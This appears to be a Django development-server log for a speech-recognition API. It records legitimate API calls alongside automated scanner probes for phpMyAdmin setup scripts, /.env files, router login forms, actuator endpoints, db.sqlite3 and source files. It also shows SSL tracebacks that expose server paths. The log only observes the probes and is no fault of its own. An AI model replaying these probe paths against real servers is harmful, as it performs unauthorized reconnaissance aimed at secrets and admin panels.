+[07/Feb/2024 08:06:49] "GET /phpMyAdmin-2.5.7-pl1/scripts/setup.php HTTP/1.0" 400 64996
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /admin/pma/scripts/setup.php
+[07/Feb/2024 08:06:49] "GET /admin/pma/scripts/setup.php HTTP/1.0" 400 64875
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin-2/scripts/setup.php
+[07/Feb/2024 08:06:50] "GET /phpMyAdmin-2/scripts/setup.php HTTP/1.0" 400 64908
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /web/phpMyAdmin/scripts/setup.php
+[07/Feb/2024 08:06:50] "GET /web/phpMyAdmin/scripts/setup.php HTTP/1.0" 400 64930
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /webadmin/scripts/setup.php
+[07/Feb/2024 08:06:51] "GET /webadmin/scripts/setup.php HTTP/1.0" 400 64864
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /admin/scripts/setup.php
+[07/Feb/2024 08:06:51] "GET /admin/scripts/setup.php HTTP/1.0" 400 64831
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /dbadmin/scripts/setup.php
+[07/Feb/2024 08:06:52] "GET /dbadmin/scripts/setup.php HTTP/1.0" 400 64853
+Not Found: /
+[07/Feb/2024 09:00:00] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[07/Feb/2024 10:03:23] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[07/Feb/2024 10:48:33] "GET / HTTP/1.0" 404 2167
+Not Found: /HNAP1/
+[07/Feb/2024 10:48:33] "GET /HNAP1/ HTTP/1.0" 404 2203
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /2Skl
+[07/Feb/2024 11:05:55] "GET /2Skl HTTP/1.0" 400 65051
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /VWy7
+[07/Feb/2024 11:05:56] "GET /VWy7 HTTP/1.0" 400 65051
+[07/Feb/2024 11:21:56] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 89
+[07/Feb/2024 11:22:39] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 90
+[07/Feb/2024 11:22:58] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 95
+[07/Feb/2024 11:23:39] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 83
+[07/Feb/2024 11:24:19] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 77
+[07/Feb/2024 11:24:47] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 82
+[07/Feb/2024 11:25:18] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[07/Feb/2024 11:25:23] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 44
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[07/Feb/2024 12:15:13] "GET / HTTP/1.0" 400 66354
+Not Found: /
+[07/Feb/2024 12:15:49] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 13:04:30] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[07/Feb/2024 13:04:34] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 13:20:25] "GET / HTTP/1.0" 404 2167
+Not Found: /robots.txt
+[07/Feb/2024 13:20:27] "GET /robots.txt HTTP/1.0" 404 2215
+Not Found: /sitemap.xml
+[07/Feb/2024 13:20:27] "GET /sitemap.xml HTTP/1.0" 404 2218
+Not Found: /.well-known/security.txt
+[07/Feb/2024 13:20:27] "GET /.well-known/security.txt HTTP/1.0" 404 2257
+Not Found: /
+[07/Feb/2024 13:20:35] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('216.218.206.66', 60082)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /
+[07/Feb/2024 13:20:54] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('216.218.206.66', 24294)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /favicon.ico
+[07/Feb/2024 13:21:01] "GET /favicon.ico HTTP/1.1" 404 2223
+----------------------------------------
+Exception happened during processing of request from ('216.218.206.66', 24298)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /
+[07/Feb/2024 13:38:21] "GET / HTTP/1.0" 404 2167
+Not Found: /HNAP1/
+[07/Feb/2024 13:38:22] "GET /HNAP1/ HTTP/1.0" 404 2203
+Not Found: /.env
+[07/Feb/2024 13:50:11] "GET /.env HTTP/1.0" 404 2197
+Not Found: /
+[07/Feb/2024 13:53:08] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 14:00:57] "GET / HTTP/1.0" 404 2170
+Not Found: /boaform/admin/formLogin
+[07/Feb/2024 15:15:21] "POST /boaform/admin/formLogin HTTP/1.0" 404 2258
+Not Found: /
+[07/Feb/2024 15:15:37] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 15:52:46] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 15:53:31] "GET / HTTP/1.0" 404 2167
+Not Found: /cf_scripts/scripts/ajax/ckeditor/ckeditor.js
+[07/Feb/2024 15:53:32] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.0" 404 2317
+Not Found: /.env
+[07/Feb/2024 15:58:07] "GET /.env HTTP/1.0" 404 2197
+Not Found: /
+[07/Feb/2024 15:58:08] "POST / HTTP/1.0" 404 2168
+Not Found: /
+[07/Feb/2024 16:00:42] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('104.131.144.23', 36338)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /RDWeb/Pages
+[07/Feb/2024 16:08:50] "GET /RDWeb/Pages HTTP/1.0" 404 2218
+Not Found: /
+[07/Feb/2024 16:12:21] "GET / HTTP/1.0" 404 2167
+Not Found: /robots.txt
+[07/Feb/2024 16:12:22] "GET /robots.txt HTTP/1.0" 404 2215
+Not Found: /sitemap.xml
+[07/Feb/2024 16:12:23] "GET /sitemap.xml HTTP/1.0" 404 2218
+Not Found: /.well-known/security.txt
+[07/Feb/2024 16:12:24] "GET /.well-known/security.txt HTTP/1.0" 404 2257
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[07/Feb/2024 17:05:58] "GET / HTTP/1.0" 400 64971
+Not Found: /
+[07/Feb/2024 17:18:27] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[07/Feb/2024 18:28:20] "GET / HTTP/1.0" 400 65839
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[07/Feb/2024 18:28:32] "GET / HTTP/1.0" 400 65837
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[07/Feb/2024 18:44:31] "GET / HTTP/1.0" 400 65711
+Not Found: /
+[07/Feb/2024 19:11:53] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 19:24:09] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[07/Feb/2024 19:35:19] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 19:35:22] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 19:35:25] "GET / HTTP/1.0" 404 2167
+Not Found: /pCaequeitoo5er2Z
+[07/Feb/2024 19:40:50] "GET /pCaequeitoo5er2Z HTTP/1.0" 404 2233
+Not Found: /
+[07/Feb/2024 20:44:02] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 20:49:21] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[07/Feb/2024 21:30:31] "GET / HTTP/1.0" 400 64578
+Not Found: /sdk
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[07/Feb/2024 21:30:31] "POST /sdk HTTP/1.0" 404 2195
+Not Found: /nmaplowercheck1707341431
+Not Found: /
+[07/Feb/2024 21:30:31] "HEAD / HTTP/1.0" 404 2168
+[07/Feb/2024 21:30:31] "GET /nmaplowercheck1707341431 HTTP/1.0" 404 2257
+Bad Request: /
+[07/Feb/2024 21:30:31] "GET / HTTP/1.0" 400 64578
+Not Found: /HNAP1
+[07/Feb/2024 21:30:31] "GET /HNAP1 HTTP/1.0" 404 2200
+Not Found: /evox/about
+[07/Feb/2024 21:30:31] "GET /evox/about HTTP/1.0" 404 2215
+Not Found: /
+[07/Feb/2024 21:30:31] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[07/Feb/2024 21:30:33] "GET / HTTP/1.0" 400 64578
+Not Found: /
+[07/Feb/2024 21:30:33] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 21:50:48] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 21:53:40] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 2200
+Not Found: /actuator/gateway/routes
+[07/Feb/2024 22:59:06] "GET /actuator/gateway/routes HTTP/1.0" 404 2257
+Not Found: /
+[07/Feb/2024 23:50:44] "GET / HTTP/1.0" 404 2167
+Not Found: /.env
+[08/Feb/2024 00:31:50] "GET /.env HTTP/1.0" 404 2197
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:80'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[08/Feb/2024 00:50:34] "GET / HTTP/1.0" 400 65350
+Not Found: /
+[08/Feb/2024 00:50:35] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[08/Feb/2024 00:52:36] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[08/Feb/2024 02:21:31] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 02:22:41] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 02:24:23] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[08/Feb/2024 02:31:29] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('65.49.20.68', 37444)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /
+[08/Feb/2024 02:31:48] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('65.49.20.68', 32530)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /favicon.ico
+[08/Feb/2024 02:31:56] "GET /favicon.ico HTTP/1.1" 404 2223
+----------------------------------------
+Exception happened during processing of request from ('65.49.20.68', 55684)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /boaform/admin/formLogin
+[08/Feb/2024 02:37:30] "POST /boaform/admin/formLogin HTTP/1.0" 404 2258
+Not Found: /
+[08/Feb/2024 04:02:47] "GET / HTTP/1.0" 404 2170
+Not Found: /actuator/health
+[08/Feb/2024 04:49:02] "GET /actuator/health HTTP/1.0" 404 2230
+Not Found: /boaform/admin/formLogin
+[08/Feb/2024 05:03:09] "POST /boaform/admin/formLogin HTTP/1.0" 404 2258
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[08/Feb/2024 05:07:25] "GET / HTTP/1.0" 400 65871
+Not Found: /
+[08/Feb/2024 05:35:33] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('192.241.225.78', 43306)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /
+[08/Feb/2024 06:03:56] "GET / HTTP/1.0" 404 2167
+[08/Feb/2024 06:20:40] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[08/Feb/2024 06:20:40] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 39
+[08/Feb/2024 06:20:40] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[08/Feb/2024 06:20:46] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[08/Feb/2024 06:21:03] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 56
+[08/Feb/2024 06:21:24] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 54
+Not Found: /
+[08/Feb/2024 06:48:38] "GET / HTTP/1.0" 404 2170
+[08/Feb/2024 07:02:33] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+Not Found: /
+[08/Feb/2024 07:11:48] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 07:21:06] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[08/Feb/2024 07:21:10] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 07:39:32] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[08/Feb/2024 07:43:14] "GET / HTTP/1.0" 400 65331
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /0.2
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[08/Feb/2024 07:43:43] "GET /0.2 HTTP/1.0" 400 65428
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /1.1
+Bad Request: /1.0
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[08/Feb/2024 07:43:43] "GET /1.1 HTTP/1.0" 400 65434
+[08/Feb/2024 07:43:43] "GET /1.0 HTTP/1.0" 400 65236
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /10.1
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[08/Feb/2024 07:43:43] "GET /10.1 HTTP/1.0" 400 65427
+Bad Request: /1.18
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[08/Feb/2024 07:43:43] "GET /1.18 HTTP/1.0" 400 65391
+Bad Request: /5.0
+Bad Request: /10.31
+[08/Feb/2024 07:43:43] "GET /5.0 HTTP/1.0" 400 65404
+Bad Request: /537.10
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[08/Feb/2024 07:43:43] "GET /10.31 HTTP/1.0" 400 65400
+[08/Feb/2024 07:43:43] "GET /537.10 HTTP/1.0" 400 65423
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /common.py
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /db.sqlite3
+[08/Feb/2024 07:43:43] "GET /common.py HTTP/1.0" 400 65482
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[08/Feb/2024 07:43:43] "GET /db.sqlite3 HTTP/1.0" 400 65327
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /deprecation.py
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /etfo.tfo
+Bad Request: /dpaste.com
+[08/Feb/2024 07:43:44] "GET /etfo.tfo HTTP/1.0" 400 65283
+[08/Feb/2024 07:43:44] "GET /deprecation.py HTTP/1.0" 400 65377
+[08/Feb/2024 07:43:44] "GET /dpaste.com HTTP/1.0" 400 65469
+Bad Request: /exception.py
+[08/Feb/2024 07:43:44] "GET /exception.py HTTP/1.0" 400 65559
+Bad Request: /python37.zip
+Bad Request: /python3.7
+[08/Feb/2024 07:43:44] "GET /python37.zip HTTP/1.0" 400 65505
+Bad Request: /request.py
+[08/Feb/2024 07:43:44] "GET /python3.7 HTTP/1.0" 400 65444
+[08/Feb/2024 07:43:44] "GET /request.py HTTP/1.0" 400 65511
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /1.0
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[08/Feb/2024 07:44:13] "GET /1.0 HTTP/1.0" 400 65248
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /10.1
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /5.0
+[08/Feb/2024 07:44:13] "GET /10.1 HTTP/1.0" 400 65403
+Bad Request: /10.31
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[08/Feb/2024 07:44:13] "GET /5.0 HTTP/1.0" 400 65358
+Bad Request: /1.1
+[08/Feb/2024 07:44:13] "GET /10.31 HTTP/1.0" 400 65412
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[08/Feb/2024 07:44:13] "GET /1.1 HTTP/1.0" 400 65382
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /0.2
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /1.18
+Bad Request: /537.10
+[08/Feb/2024 07:44:13] "GET /0.2 HTTP/1.0" 400 65454
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[08/Feb/2024 07:44:13] "GET /1.18 HTTP/1.0" 400 65435
+Bad Request: /common.py
+[08/Feb/2024 07:44:13] "GET /537.10 HTTP/1.0" 400 65447
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /db.sqlite3
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[08/Feb/2024 07:44:14] "GET /common.py HTTP/1.0" 400 65276
